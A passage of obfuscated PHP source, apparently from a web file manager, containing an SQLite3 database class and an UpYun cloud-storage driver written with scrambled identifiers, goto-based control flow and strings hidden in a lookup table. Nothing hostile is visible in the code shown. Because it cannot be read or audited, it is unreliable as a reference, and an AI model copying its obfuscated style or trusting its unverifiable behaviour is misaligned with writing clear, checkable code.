$fµ™²»óŞÓ .= $f¼ë¡ÇìºÒ[48] . $Fé†ëÔª™Ö[1] . $f¼ë¡ÇìºÒ[49] . $Fé†ëÔª™Ö[0] . $f¼ë¡ÇìºÒ[50]; } else { $fµ™²»óŞÓ .= $f¼ë¡ÇìºÒ[48] . $Fé†ëÔª™Ö[0] . $f¼ë¡ÇìºÒ[50]; } } return $fµ™²»óŞÓ; } } class DbSqlite3Base extends Db { public function __construct($DõÃŸªã¸ñ = '') { $cŠ‚½Û·ƒÙ =& $_SERVER[Šº]; if (!class_exists($cŠ‚½Û·ƒÙ[51])) { think_exception(think_lang($cŠ‚½Û·ƒÙ[10]) . $cŠ‚½Û·ƒÙ[52]); } if (!empty($DõÃŸªã¸ñ)) { if (!isset($DõÃŸªã¸ñ[$cŠ‚½Û·ƒÙ[12]])) { $DõÃŸªã¸ñ[$cŠ‚½Û·ƒÙ[12]] = 438; } $this->config = $DõÃŸªã¸ñ; if (empty($this->config[$cŠ‚½Û·ƒÙ[13]])) { $this->config[$cŠ‚½Û·ƒÙ[13]] = array(); } } } public function connect($AÌí›óÉÓ = '', $E¢ØØéò’Æ = 0) { $BÄÛÉÅ†ëí =& $_SERVER[Šº]; if (!isset($this->linkID[$E¢ØØéò’Æ])) { if (empty($AÌí›óÉÓ)) { $AÌí›óÉÓ = $this->config; } $this->linkID[$E¢ØØéò’Æ] = new SQLite3($AÌí›óÉÓ[$BÄÛÉÅ†ëí[17]]); if (!$this->linkID[$E¢ØØéò’Æ]) { think_exception($this->linkID[$E¢ØØéò’Æ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$E¢ØØéò’Æ]->busyTimeout(30000); if (1 != think_config($BÄÛÉÅ†ëí[18])) { unset($this->config); } } return $this->linkID[$E¢ØØéò’Æ]; } public function free() { $this->queryID = null; } public function query($fÓ¡šùïœØ) { goto D¶®–¨åĞù; fŠíÚÔ±İÚ: think_status($D–í„Äø[20]); $this->queryID = $this->_linkID->query($fÓ¡šùïœØ); $this->debug(); goto Dßí‚»ˆ¿; B…ó™ÆëŠá: $this->queryStr = $fÓ¡šùïœØ; if ($this->queryID) { $this->free(); } think_action_status($D–í„Äø[19], 1); goto fŠíÚÔ±İÚ; Dßí‚»ˆ¿: if (!1 === $this->queryID) { $this->error(); return !1; } else { $FÍàŒ´Ç¬ = $this->getAll(); $this->numRows = count($FÍàŒ´Ç¬); return $FÍàŒ´Ç¬; } goto A“Ş¹„ñŠ; D¶®–¨åĞù: $D–í„Äø =& $_SERVER[Šº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B…ó™ÆëŠá; A“Ş¹„ñŠ: } public function execute($fÖğŸ¦ŠÜî) { goto c›Ïé…·õ; c›Ïé…·õ: $d­ÛŞ•áˆ« =& $_SERVER[Šº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bïÊÃÉÍ®; B“— Âˆ—: think_status($d­ÛŞ•áˆ«[20]); $e±ìù˜ÜóŞ = $this->_linkID->exec($fÖğŸ¦ŠÜî); $this->debug(); goto f«ÒŒñî…; bïÊÃÉÍ®: $this->queryStr = $fÖğŸ¦ŠÜî; if ($this->queryID) { $this->free(); } think_action_status($d­ÛŞ•áˆ«[21], 1); goto B“— Âˆ—; f«ÒŒñî…: if (!1 === $e±ìù˜ÜóŞ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto eØç‚¯†Ç ; eØç‚¯†Ç : } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Šº][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÉôùÃŞšì = $this->_linkID->query($_SERVER[Šº][23]); if (!$aÉôùÃŞšì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $e¹ŸÂË…í = $this->_linkID->query($_SERVER[Šº][24]); if (!$e¹ŸÂË…í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $FáĞ†µÜ° = array(); while ($Bª‡Ù¤çÊ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $FáĞ†µÜ°[] = $Bª‡Ù¤çÊ; } $this->queryID->reset(); return $FáĞ†µÜ°; } public function getFields($C»íêë‚ø²) { $Dæ‘ì½ï¤ò =& $_SERVER[Šº]; $AÌĞµ”¨Ùá = $this->query($Dæ‘ì½ï¤ò[25] . $C»íêë‚ø² . $Dæ‘ì½ï¤ò[26]); $FÙÎÖÀ¬Œ¾ = array(); if ($AÌĞµ”¨Ùá) { foreach ($AÌĞµ”¨Ùá as $Aç¡›ƒ…¶Ï => $DÅ”¨˜Á«Ñ) { $FÙÎÖÀ¬Œ¾[$DÅ”¨˜Á«Ñ[$Dæ‘ì½ï¤ò[28]]] = array($Dæ‘ì½ï¤ò[28] => $DÅ”¨˜Á«Ñ[$Dæ‘ì½ï¤ò[28]], $Dæ‘ì½ï¤ò[29] => $DÅ”¨˜Á«Ñ[$Dæ‘ì½ï¤ò[29]], $Dæ‘ì½ï¤ò[31] => (bool) ($DÅ”¨˜Á«Ñ[$Dæ‘ì½ï¤ò[31]] === $Dæ‘ì½ï¤ò[33]), $Dæ‘ì½ï¤ò[34] => $DÅ”¨˜Á«Ñ[$Dæ‘ì½ï¤ò[53]], $Dæ‘ì½ï¤ò[36] => (bool) $DÅ”¨˜Á«Ñ[$Dæ‘ì½ï¤ò[54]], $Dæ‘ì½ï¤ò[39] => (bool) $DÅ”¨˜Á«Ñ[$Dæ‘ì½ï¤ò[54]]); } } return $FÙÎÖÀ¬Œ¾; } public function getTables($DÜÅ¶…èáÏ = '') { $cš–ºÜ¹‡Œ =& $_SERVER[Šº]; $d¾¿È¸Ä‘ = $this->query($cš–ºÜ¹‡Œ[42] . $cš–ºÜ¹‡Œ[43] . $cš–ºÜ¹‡Œ[44]); $E½Ú·„Úœé = array(); foreach ($d¾¿È¸Ä‘ as $bÉÃ‰İ’… => $a‰³‹ÁÓ—™) { $E½Ú·„Úœé[$bÉÃ‰İ’…] = current($a‰³‹ÁÓ—™); } return $E½Ú·„Úœé; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Dá›„Å£À‹ =& $_SERVER[Šº]; $this->error = $this->_linkID->lastErrorMsg(); if ($Dá›„Å£À‹[33] != $this->queryStr) { $this->error .= LNG($Dá›„Å£À‹[45]) . $this->queryStr; } think_trace($this->error, $Dá›„Å£À‹[33], $Dá›„Å£À‹[46]); return $this->error; } public function escapeString($EçÚ†ÏöÃ) { $C†Û¯ÓÇ =& $_SERVER[Šº]; if ($this->_linkID) { return $this->_linkID->escapeString($EçÚ†ÏöÃ); } return str_ireplace($C†Û¯ÓÇ[55], $C†Û¯ÓÇ[56], $EçÚ†ÏöÃ); } public function parseLimit($cƒ¯Ÿ¢‰Ü) { $d Œ‚ù½á =& $_SERVER[Šº]; $A”Ş§î¨ÂÙ = $d Œ‚ù½á[33]; if (!empty($cƒ¯Ÿ¢‰Ü)) { $cƒ¯Ÿ¢‰Ü = explode($d Œ‚ù½á[47], $cƒ¯Ÿ¢‰Ü); if (count($cƒ¯Ÿ¢‰Ü) > 1) { $A”Ş§î¨ÂÙ .= $d Œ‚ù½á[48] . $cƒ¯Ÿ¢‰Ü[1] . $d Œ‚ù½á[49] . $cƒ¯Ÿ¢‰Ü[0] . $d Œ‚ù½á[50]; } else { $A”Ş§î¨ÂÙ .= $d Œ‚ù½á[48] . $cƒ¯Ÿ¢‰Ü[0] . $d Œ‚ù½á[50]; } } return $A”Ş§î¨ÂÙ; } } goto f÷œğ­…; CğŸ”Š‰ñ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\x3a\57\57\166\x30\x2e\141\x70\151\56\x75\160\171\165\156\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($dˆ«Õ›Ãò) { parent::__construct(); $this->_init($dˆ«Õ›Ãò); } public function _init($eö¹É‹øÚ) { $F‘Ã’ßø =& $_SERVER[Šº]; foreach ($eö¹É‹øÚ as $d¢“–ìºˆŠ => $d¢•ø•Ï×) { if (isset($this->{$d¢“–ìºˆŠ})) { $this->{$d¢“–ìºˆŠ} = $d¢•ø•Ï×; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($F‘Ã’ßø[1317] . LNG($F‘Ã’ßø[1249])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($bñ¸Ï –ÀÎ, $cóéçŞŞÙ = "\x47\x45\124") { $Aé‹×İó”Ã =& $_SERVER[Šº]; $e«¶ŞÉ¼ß› = gmdate($Aé‹×İó”Ã[1283]); $dƒç¨©ƒÂ = base64_encode(hash_hmac($Aé‹×İó”Ã[1318], "{$cóéçŞŞÙ}\x26{$bñ¸Ï –ÀÎ}\46{$e«¶ŞÉ¼ß›}", md5("{$this->userpass}"), !0)); $b«ô«…­¹­ = array("\101\x75\164\150\x6f\162\151\x7a\x61\x74\x69\157\156\72\125\x50\x59\125\116\40{$this->username}\72{$dƒç¨©ƒÂ}", "\104\x61\x74\x65\72{$e«¶ŞÉ¼ß›}"); return $b«ô«…­¹­; } public function ussRequest($bîõ³¸è”Ç, $dö¡µğğ– = "\x47\x45\124", $CŒå±õ·§® = false, $b‘˜Œ£¢¥¼ = false, $e»ŞòÇñÜµ = false) { goto b‚’¥ÂÊ²‡; b‚’¥ÂÊ²‡: $e„„„Æí¥ =& $_SERVER[Šº]; $bîõ³¸è”Ç = trim($bîõ³¸è”Ç, $e„„„Æí¥[8]); $cĞ§æŠåÓ = "\57{$this->bucket}\57{$bîõ³¸è”Ç}"; goto DêÅ“„š; DêÅ“„š: $b™¤Š³Ï¤ = $this->ussHeaders($cĞ§æŠåÓ, $dö¡µğğ–); if ($b‘˜Œ£¢¥¼) { $b™¤Š³Ï¤ = array_merge($b™¤Š³Ï¤, $b‘˜Œ£¢¥¼); } $BÈ†ØÁô´Ò = url_request($this->endpoint . $cĞ§æŠåÓ, $dö¡µğğ–, $CŒå±õ·§®, $b™¤Š³Ï¤, $e»ŞòÇñÜµ); goto b‡ó¤ŠƒÚà; b‡ó¤ŠƒÚà: if (!$BÈ†ØÁô´Ò) { return array($e„„„Æí¥[1074] => !1, $e„„„Æí¥[1076] => $e„„„Æí¥[1319]); } if (strtolower($dö¡µğğ–) == $e„„„Æí¥[190] || in_array($BÈ†ØÁô´Ò[$e„„„Æí¥[1074]], array($e„„„Æí¥[1175], $e„„„Æí¥[1320]))) { $CŒå±õ·§® = $BÈ†ØÁô´Ò[$e„„„Æí¥[1321]]; } else { $CŒå±õ·§® = json_decode($BÈ†ØÁô´Ò[$e„„„Æí¥[1076]], !0); if (!$CŒå±õ·§®) { $CŒå±õ·§® = $BÈ†ØÁô´Ò[$e„„„Æí¥[1076]]; } else { if (!$BÈ†ØÁô´Ò[$e„„„Æí¥[711]] && isset($CŒå±õ·§®[$e„„„Æí¥[1322]])) { $CŒå±õ·§® = $CŒå±õ·§®[$e„„„Æí¥[1322]]; } } } return array($e„„„Æí¥[1074] => $BÈ†ØÁô´Ò[$e„„„Æí¥[711]], $e„„„Æí¥[1076] => $CŒå±õ·§®); goto dåİÄÆ¸îã; dåİÄÆ¸îã: } public function mkfile($E“ê”­×¬Ö, $CñÆâ™ğ²ù = '', $BæàŞ¶µøø = REPEAT_RENAME) { if ($this->setContent($E“ê”­×¬Ö, $CñÆâ™ğ²ù)) { return $this->getPathOuter($E“ê”­×¬Ö); } return !1; } public function mkdir($cä½©ççÉ, $eº¯Í¦Øï = REPEAT_SKIP) { $côÄ™ªäĞö =& $_SERVER[Šº]; $Cİ…®Ö‡Ï = trim($cä½©ççÉ, $côÄ™ªäĞö[8]); if ($this->_isFolder($Cİ…®Ö‡Ï)) { return $this->getPathOuter($Cİ…®Ö‡Ï); } $F¢×ŸÆØªÖ = array($côÄ™ªäĞö[1323]); $DùøÃ‰„ÃÀ = $this->ussRequest($Cİ…®Ö‡Ï, $côÄ™ªäĞö[223], !1, $F¢×ŸÆØªÖ); return $DùøÃ‰„ÃÀ[$côÄ™ªäĞö[1074]] ? $this->getPathOuter($Cİ…®Ö‡Ï) : !1; } public function copyFile($D˜›ÁçÂ¤, $C†Äô‘¼¬£) { $d¼‘‘±é¹Ê =& $_SERVER[Šº]; $E´ˆªÊ¤ˆ = array($d¼‘‘±é¹Ê[1324] . "\x2f{$this->bucket}\x2f{$D˜›ÁçÂ¤}", $d¼‘‘±é¹Ê[1325]); $CµŒÁ‚ãØŒ = $this->ussRequest($C†Äô‘¼¬£, $d¼‘‘±é¹Ê[225], !1, $E´ˆªÊ¤ˆ); return $CµŒÁ‚ãØŒ[$d¼‘‘±é¹Ê[1074]] ? !0 : $this->getPathOuter($C†Äô‘¼¬£); } public function moveFile($FË™õ£Ü•, $eç¤¸ÅˆË ) { $D­òßì§Û™ =& $_SERVER[Šº]; $F‹ùÊ¯…À = array($D­òßì§Û™[1326] . "\57{$this->bucket}\57{$FË™õ£Ü•}", $D­òßì§Û™[1325]); $e¼©áĞØËâ = $this->ussRequest($eç¤¸ÅˆË , $D­òßì§Û™[225], !1, $F‹ùÊ¯…À); return $e¼©áĞØËâ[$D­òßì§Û™[1074]] ? !0 : $this->getPathOuter($eç¤¸ÅˆË ); } public function delFile($FĞ¾óÍ¼Â±) { $Bˆ‰‰…é“Ó =& $_SERVER[Šº]; $E³†‹…• = $this->ussRequest($FĞ¾óÍ¼Â±, $Bˆ‰‰…é“Ó[1327]); return $E³†‹…•[$Bˆ‰‰…é“Ó[1074]] ? !0 : !1; } public function delFolder($dåÁ¯ê½ÎÕ) { goto a˜¶âòé¥´; a˜¶âòé¥´: $C§’Á¶¢ ¥ =& $_SERVER[Šº]; if (!$this->exist($dåÁ¯ê½ÎÕ)) { return !0; } $this->listItemCache = !1; goto fÜÎ™¡ô; fÜÎ™¡ô: $e™…Ûã¦¾ = $aöÔ¯Ë‡šÉ = array(); $this->fileList($dåÁ¯ê½ÎÕ, $e™…Ûã¦¾, $aöÔ¯Ë‡šÉ, !0); $this->listItemCache = !0; goto CÀˆİÉ²Ú’; F¼–¤Ô¾Ù: return $aµ…„¶ÏÂà[$C§’Á¶¢ ¥[1074]]; goto d‡†²›°ê; CÀˆİÉ²Ú’: foreach ($aöÔ¯Ë‡šÉ as $F§¡… Î¸ö) { $aµ…„¶ÏÂà = $this->ussRequest($F§¡… Î¸ö[$C§’Á¶¢ ¥[28]], $C§’Á¶¢ ¥[1327]); if (!$aµ…„¶ÏÂà[$C§’Á¶¢ ¥[1074]]) { return !1; } } foreach ($e™…Ûã¦¾ as $dÑ¯¯ÙĞİÔ) { $aµ…„¶ÏÂà = $this->ussRequest($dÑ¯¯ÙĞİÔ, $C§’Á¶¢ ¥[1327]); if (!$aµ…„¶ÏÂà[$C§’Á¶¢ ¥[1074]]) { return !1; } } $aµ…„¶ÏÂà = $this->ussRequest($dåÁ¯ê½ÎÕ, $C§’Á¶¢ ¥[1327]); goto F¼–¤Ô¾Ù; d‡†²›°ê: } public function rename($fÛ™åÖ°, $DİÙ›ÑëÓø) { if ($this->isFile($fÛ™åÖ°)) { $DİÙ›ÑëÓø = get_path_father($fÛ™åÖ°) . $DİÙ›ÑëÓø; return $this->moveFile($fÛ™åÖ°, $DİÙ›ÑëÓø); } return $this->renameObject($fÛ™åÖ°, $DİÙ›ÑëÓø); } public function fileInfo($FŸšÚ¸†¶³, $Cá¹‡éÛ‹Â = false, $F½Ï–¡îÀ• = array()) { goto A—Ö—¿™È‡; fÜ•¬Üà‘: $BÓâå“·Â²[$aë¼ÎÏóçİ[193]] = intval($F½Ï–¡îÀ•[$aë¼ÎÏóçİ[1328]]); $BÓâå“·Â²[$aë¼ÎÏóçİ[84]] = intval($F½Ï–¡îÀ•[$aë¼ÎÏóçİ[1329]]); $BÓâå“·Â²[$aë¼ÎÏóçİ[78]] = $F½Ï–¡îÀ•[$aë¼ÎÏóçİ[78]]; goto b£¹İŒ±©; A—Ö—¿™È‡: $aë¼ÎÏóçİ =& $_SERVER[Šº]; $BÓâå“·Â² = array($aë¼ÎÏóçİ[28] => $this->pathThis($FŸšÚ¸†¶³), $aë¼ÎÏóçİ[76] => $this->getPathOuter($aë¼ÎÏóçİ[8] . $FŸšÚ¸†¶³), $aë¼ÎÏóçİ[29] => $aë¼ÎÏóçİ[192], $aë¼ÎÏóçİ[78] => isset($F½Ï–¡îÀ•[$aë¼ÎÏóçİ[78]]) ? $F½Ï–¡îÀ•[$aë¼ÎÏóçİ[78]] : 0, $aë¼ÎÏóçİ[168] => $this->ext($FŸšÚ¸†¶³)); if ($Cá¹‡éÛ‹Â) { return $BÓâå“·Â²; } goto dİŠ¼«¹ã«; dİŠ¼«¹ã«: $BÓâå“·Â²[$aë¼ÎÏóçİ[193]] = $BÓâå“·Â²[$aë¼ÎÏóçİ[84]] = 0; $BÓâå“·Â²[$aë¼ÎÏóçİ[194]] = $BÓâå“·Â²[$aë¼ÎÏóçİ[195]] = !0; if (empty($F½Ï–¡îÀ•)) { $F½Ï–¡îÀ• = $this->objectMeta($FŸšÚ¸†¶³); if (!$F½Ï–¡îÀ•) { return $BÓâå“·Â²; } } goto fÜ•¬Üà‘; b£¹İŒ±©: return $BÓâå“·Â²; goto aè¤±£®¯¶; aè¤±£®¯¶: } public function folderInfo($f£‹ÀÄ¤, $cóøâÉÆ¿ = false) { goto cÒô—˜ÄÔ¬; D˜ÓØ„ğ : $D»® Ùß”ñ[$C°­ŠŸŒ„ê[193]] = $D»® Ùß”ñ[$C°­ŠŸŒ„ê[84]] = 0; $D»® Ùß”ñ[$C°­ŠŸŒ„ê[194]] = $D»® Ùß”ñ[$C°­ŠŸŒ„ê[195]] = !0; if (empty($EŞèî’¤˜)) { $EŞèî’¤˜ = $this->objectMeta($f£‹ÀÄ¤); if (!$EŞèî’¤˜) { return $D»® Ùß”ñ; } } goto fŞÆ½Ï¬; cÒô—˜ÄÔ¬: $C°­ŠŸŒ„ê =& $_SERVER[Šº]; $D»® Ùß”ñ = array($C°­ŠŸŒ„ê[28] => $this->pathThis($f£‹ÀÄ¤), $C°­ŠŸŒ„ê[76] => $this->getPathOuter($C°­ŠŸŒ„ê[8] . $f£‹ÀÄ¤), $C°­ŠŸŒ„ê[29] => $C°­ŠŸŒ„ê[77]); if ($cóøâÉÆ¿) { return $D»® Ùß”ñ; } goto D˜ÓØ„ğ ; fŞÆ½Ï¬: $D»® Ùß”ñ[$C°­ŠŸŒ„ê[193]] = intval($EŞèî’¤˜[$C°­ŠŸŒ„ê[1328]]); $D»® Ùß”ñ[$C°­ŠŸŒ„ê[84]] = intval($EŞèî’¤˜[$C°­ŠŸŒ„ê[1329]]); return $D»® Ùß”ñ; goto aù²¹Šµä©; aù²¹Šµä©: } private function listObjs($dÂƒªùÀÚ, $c·¢¸äš´¡ = 0, $BéãÓ ÖãÎ = 1000) { $a¥ô„á»ßâ =& $_SERVER[Šº]; $cŞÌÌß¨¯î = array($a¥ô„á»ßâ[1330], $a¥ô„á»ßâ[1331] . $BéãÓ ÖãÎ); if ($c·¢¸äš´¡) { $cŞÌÌß¨¯î[] = $a¥ô„á»ßâ[1332] . $c·¢¸äš´¡; } $e™°àù‰™ = $this->ussRequest($dÂƒªùÀÚ, $a¥ô„á»ßâ[227], !1, $cŞÌÌß¨¯î); return !$e™°àù‰™[$a¥ô„á»ßâ[1074]] ? !1 : $e™°àù‰™[$a¥ô„á»ßâ[1076]]; } private function fileList($dºÛ´ò†Ê¿, &$F¤öµâëó’, &$DÔâ¾ì£ë¡, $BœŒÇøùã· = false) { goto dÃªßöÃ×©; dÃªßöÃ×©: $BÁ—ÇÂ›œí =& $_SERVER[Šº]; $bÛ–ÄÀ‡ = $BÁ—ÇÂ›œí[33]; $cÇ¼Éë¿§‘ = 1000; goto fŒÏ‚ùš ¬; FÍ¡ê÷ğ–‹: if ($bÛ½õÑÌ¢•) { $this->cacheMethod($BÁ—ÇÂ›œí[198], $dºÛ´ò†Ê¿, !0); } goto eÕºÚù¼š; fŒÏ‚ùš ¬: $DøÜâÊ˜å­ = rtrim($dºÛ´ò†Ê¿, $BÁ—ÇÂ›œí[8]) . $BÁ—ÇÂ›œí[8]; $bÛ½õÑÌ¢• = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $A»´§Š½®ò = $this->listObjs($dºÛ´ò†Ê¿, $bÛ–ÄÀ‡, $cÇ¼Éë¿§‘); if (!$A»´§Š½®ò) { return !1; } $bÛ–ÄÀ‡ = isset($A»´§Š½®ò[$BÁ—ÇÂ›œí[1333]]) ? $A»´§Š½®ò[$BÁ—ÇÂ›œí[1333]] : $BÁ—ÇÂ›œí[33]; $dì¡œŒ¢±Ô = isset($A»´§Š½®ò[$BÁ—ÇÂ›œí[1334]]) ? $A»´§Š½®ò[$BÁ—ÇÂ›œí[1334]] : array(); foreach ($dì¡œŒ¢±Ô as $eï·¶Ë’Êí) { $Fâ—ÜåšŠ‘ = $eï·¶Ë’Êí[$BÁ—ÇÂ›œí[29]] == $BÁ—ÇÂ›œí[77] ? !0 : !1; $bâ­çµê‘ = ltrim($DøÜâÊ˜å­ . $eï·¶Ë’Êí[$BÁ—ÇÂ›œí[28]], $BÁ—ÇÂ›œí[8]) . ($Fâ—ÜåšŠ‘ ? $BÁ—ÇÂ›œí[8] : $BÁ—ÇÂ›œí[33]); $eééÑê™‰ = array($BÁ—ÇÂ›œí[28] => $bâ­çµê‘, $BÁ—ÇÂ›œí[29] => $Fâ—ÜåšŠ‘ ? $BÁ—ÇÂ›œí[77] : $BÁ—ÇÂ›œí[192], $BÁ—ÇÂ›œí[78] => $eï·¶Ë’Êí[$BÁ—ÇÂ›œí[334]], $BÁ—ÇÂ›œí[1329] => $eï·¶Ë’Êí[$BÁ—ÇÂ›œí[1335]]); if ($bÛ½õÑÌ¢•) { $this->cacheMethod($BÁ—ÇÂ›œí[198], $bâ­çµê‘, $Fâ—ÜåšŠ‘); $this->cacheMethod($BÁ—ÇÂ›œí[199], $bâ­çµê‘, $eééÑê™‰); } if ($Fâ—ÜåšŠ‘) { $F¤öµâëó’[] = $bâ­çµê‘; if ($BœŒÇøùã·) { $this->fileList($bâ­çµê‘, $F¤öµâëó’, $DÔâ¾ì£ë¡, $BœŒÇøùã·); } continue; } $DÔâ¾ì£ë¡[] = $eééÑê™‰; } if (count($dì¡œŒ¢±Ô) < $cÇ¼Éë¿§‘) { break; } } goto FÍ¡ê÷ğ–‹; eÕºÚù¼š: } public function listPath($DŠÉÔÎã‹Ô, $FÇÊàº³ñ = false) { $F¤Ú¹¯‘‚ =& $_SERVER[Šº]; $D¥ßÒÑÏ¿— = $DÕßÑ…‰ = array(); $this->fileList($DŠÉÔÎã‹Ô, $D¥ßÒÑÏ¿—, $DÕßÑ…‰); foreach ($D¥ßÒÑÏ¿— as $A‡‡¾ÓÓí => $A±áèğÈ˜¼) { $D¥ßÒÑÏ¿—[$A‡‡¾ÓÓí] = $this->folderInfo($A±áèğÈ˜¼, $FÇÊàº³ñ); } foreach ($DÕßÑ…‰ as $A‡‡¾ÓÓí => $A±áèğÈ˜¼) { $DÕßÑ…‰[$A‡‡¾ÓÓí] = $this->fileInfo($A±áèğÈ˜¼[$F¤Ú¹¯‘‚[28]], $FÇÊàº³ñ, $A±áèğÈ˜¼); } return array($F¤Ú¹¯‘‚[75] => $D¥ßÒÑÏ¿—, $F¤Ú¹¯‘‚[74] => $DÕßÑ…‰); } public function has($f ³½­Ùè, $Eßå×Óš = false, $AÆèƒ¯Š‹ = true) { goto cê¨¶½Ü‘; cê¨¶½Ü‘: $dñ©šğä’ô =& $_SERVER[Šº]; $c ¥â¡¢™Ñ = $dñ©šğä’ô[33]; $AÙ‘šù‚ì = 500; goto Bäñå±†Ÿ“; bÍ¤ÔÍ›ë: while (!0) { check_abort(); $BÒ©Ëå¦Û = $this->listObjs($f ³½­Ùè, $c ¥â¡¢™Ñ, $AÙ‘šù‚ì); if (!$BÒ©Ëå¦Û) { return !1; } $c ¥â¡¢™Ñ = isset($BÒ©Ëå¦Û[$dñ©šğä’ô[1333]]) ? $BÒ©Ëå¦Û[$dñ©šğä’ô[1333]] : $dñ©šğä’ô[33]; $eˆ®¯Ö™¬ã = isset($BÒ©Ëå¦Û[$dñ©šğä’ô[1334]]) ? $BÒ©Ëå¦Û[$dñ©šğä’ô[1334]] : array(); if (empty($eˆ®¯Ö™¬ã)) { break; } $A¤¡¸÷²Ş… = array_filter($eˆ®¯Ö™¬ã, function ($DìÒ²ÇÁŒØ) { $AÜ½°¤È§î =& $_SERVER[Šº]; return $DìÒ²ÇÁŒØ[$AÜ½°¤È§î[29]] == $AÜ½°¤È§î[77]; }); $eÉÒ­§Û‰† = count($eˆ®¯Ö™¬ã); $A¤¡¸÷²Ş… = count($A¤¡¸÷²Ş…); $bÖİ¾˜ÚÃƒ = $eÉÒ­§Û‰† - $A¤¡¸÷²Ş…; if ($Eßå×Óš) { $b¯ù‘ğÃ += $A¤¡¸÷²Ş…; $Bø¨Ï½  µ += $bÖİ¾˜ÚÃƒ; if ($eÉÒ­§Û‰† < $AÙ‘šù‚ì) { break; } continue; } if ($AÆèƒ¯Š‹) { if ($bÖİ¾˜ÚÃƒ) { return !0; } } else { if ($A¤¡¸÷²Ş…) { return !0; } } if ($eÉÒ­§Û‰† < $AÙ‘šù‚ì) { break; } } if ($Eßå×Óš) { return array($dñ©šğä’ô[202] => $Bø¨Ï½  µ, $dñ©šğä’ô[203] => $b¯ù‘ğÃ); } return !1; goto Bòß­“±ë»; Bäñå±†Ÿ“: $Bø¨Ï½  µ = 0; $b¯ù‘ğÃ = 0; $Côíô¤ØÛ = rtrim($f ³½­Ùè, $dñ©šğä’ô[8]) . $dñ©šğä’ô[8]; goto bÍ¤ÔÍ›ë; Bòß­“±ë»: } public function listAll($e§éÅ‹İ­ö) { goto cáŒÜÖšÕ; f¦¸Â•ƒ‹ğ: return $this->listAllFiles($e§éÅ‹İ­ö, array_keys($dô§™ÏìŸ), $dô§™ÏìŸ); goto b›æŒŒÅİç; A¡„¡øÆ: $dô§™ÏìŸ = array(); foreach ($cŠá¯ë¥Œ as $fÒŸÙÓ¿¥) { $dô§™ÏìŸ[$fÒŸÙÓ¿¥[$BÌ†‘¼ÕÛ[28]]] = $fÒŸÙÓ¿¥[$BÌ†‘¼ÕÛ[78]]; } foreach ($c´‡‰÷ as $fÒŸÙÓ¿¥) { if (is_string($fÒŸÙÓ¿¥)) { $dô§™ÏìŸ[$fÒŸÙÓ¿¥] = 0; } } goto f¦¸Â•ƒ‹ğ; cáŒÜÖšÕ: $BÌ†‘¼ÕÛ =& $_SERVER[Šº]; $c´‡‰÷ = $cŠá¯ë¥Œ = array(); $this->fileList($e§éÅ‹İ­ö, $c´‡‰÷, $cŠá¯ë¥Œ, !0); goto A¡„¡øÆ; b›æŒŒÅİç: } public function canRead($B†ÛåĞ„) { return $this->exist($B†ÛåĞ„) ? !0 : !1; } public function canWrite($cßîã±¸á’) { return $this->exist($cßîã±¸á’) ? !0 : !1; } public function getContent($E§ÌéÖßñ) { return $this->fileSubstr($E§ÌéÖßñ, 0, -1); } public function setContent($Aâ¼ìÂî§, $Dè«İªµí = '') { $dËÔìŠà =& $_SERVER[Šº]; if (!$Dè«İªµí) { $BÌÂ°×Íå’ = $this->ussRequest($Aâ¼ìÂî§, $dËÔìŠà[223]); return $BÌÂ°×Íå’[$dËÔìŠà[1074]]; } $B˜¢›™Ñ­¯ = $this->tempFile($this->pathThis($Aâ¼ìÂî§)); file_put_contents($B˜¢›™Ñ­¯, $Dè«İªµí); if ($this->upload($Aâ¼ìÂî§, $B˜¢›™Ñ­¯)) { $this->tempFileRemve($B˜¢›™Ñ­¯); return !0; } return !1; } public function fileSubstr($F…„çØÆâ•, $BÕçÓ‡ØÃ, $CÀ‚Õ—Š¬) { $eø«ñáˆêÕ =& $_SERVER[Šº]; if (!($aËÉÚåÆ‘ƒ = $this->link($F…„çØÆâ•))) { return !1; } $EäÒŸ£¯°« = !1; if ($CÀ‚Õ—Š¬ > 0) { $F·´µ’ÙÍî = $BÕçÓ‡ØÃ + $CÀ‚Õ—Š¬ - 1; $EäÒŸ£¯°« = array($eø«ñáˆêÕ[1296] . $BÕçÓ‡ØÃ . $eø«ñáˆêÕ[447] . $F·´µ’ÙÍî); } $bÁ³êª‚ó· = url_request($aËÉÚåÆ‘ƒ, $eø«ñáˆêÕ[227], !1, $EäÒŸ£¯°«); return $bÁ³êª‚ó·[$eø«ñáˆêÕ[711]] ? $bÁ³êª‚ó·[$eø«ñáˆêÕ[1076]] : !1; } public function upload($DËôó‡Ñ–¹, $aÖÇÍÂ­Á•, $c¢šŒÛÈÙï = false, $F˜˜ÔÒŒöù = REPEAT_REPLACE) { goto aÚ“ˆÙ¿Ä; cñÅÏˆ³àÊ: $BÅ„ÉÛéáî = $B­ê‘¯Î¦[$d¿ìÄøËê[1341]]; $b‡ğŸ÷’Œİ = fopen($aÖÇÍÂ­Á•, $d¿ìÄøËê[1245]); if (!$b‡ğŸ÷’Œİ) { return !1; } goto Fõ¥¡¹¨åÂ; DÖë‹–ğ: $DÕÚÑ–Óª = 1024 * 1024 * 10; $A—Ò—Íğ™æ = array($d¿ìÄøËê[1337], $d¿ìÄøËê[1338] . $F´ÈÛÚÚ·“, $d¿ìÄøËê[1339], $d¿ìÄøËê[1340] . $DÕÚÑ–Óª); 